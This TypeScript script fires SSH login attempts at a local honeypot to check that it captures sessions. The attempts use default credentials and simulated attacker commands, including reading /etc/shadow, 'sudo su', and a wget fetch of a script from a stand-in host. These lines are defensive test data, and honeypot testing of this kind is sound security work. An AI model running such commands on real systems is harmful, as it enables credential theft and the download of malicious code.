/**
 * Fires real SSH sessions at the honeypot to verify capture.
 * Usage: node --experimental-strip-types scripts/probe-honeypot.ts
 */
import ssh2 from "ssh2";

const { Client } = ssh2;
const PORT = Number(process.env.HONEYPOT_PORT ?? 2222);

const ATTEMPTS = [
  {
    user: "root",
    pass: "admin123",
    cmds: ["whoami", "ls", "cat /etc/shadow", "wget http://10.0.0.1/x.sh"],
  },
  { user: "admin", pass: "password", cmds: ["sudo su", "uname -a"] },
  { user: "test", pass: "test", cmds: [] },
];

function attempt(a: (typeof ATTEMPTS)[number]): Promise<string[]> {
  return new Promise((resolvePromise) => {
    const seen: string[] = [];
    const conn = new Client();
    let next = 0;

    conn.on("ready", () => {
      seen.push("auth accepted (honeypot accepts anything)");
      conn.shell((err, stream) => {
        if (err) {
          resolvePromise([...seen, `shell err: ${err.message}`]);
          return;
        }
        stream.on("data", (d: Buffer) => {
          let text = d.toString();
          // The honeypot re-prompts with "~$ " after every command it answers.
          while (text.includes("~$ ") && next < a.cmds.length) {
            const cmd = a.cmds[next++];
            seen.push(`sent: ${cmd}`);
            stream.write(cmd + "\n");
            text = text.slice(text.lastIndexOf("~$ ") + 3);
          }
        });
        setTimeout(() => {
          stream.end();
          conn.end();
          resolvePromise(seen);
        }, 700);
        stream.write("\n");
      });
    });
    conn.on("error", (e: Error) => {
      seen.push(`error: ${e.message}`);
      setTimeout(() => resolvePromise(seen), 300);
    });
    conn.connect({
      port: PORT,
      host: "127.0.0.1",
      username: a.user,
      password: a.pass,
      readyTimeout: 5000,
    });
  });
}

for (const a of ATTEMPTS) {
  const out = await attempt(a);
  console.log(`\n=== ${a.user}:${a.pass} ===`);
  out.forEach((l) => console.log("  " + l));
}
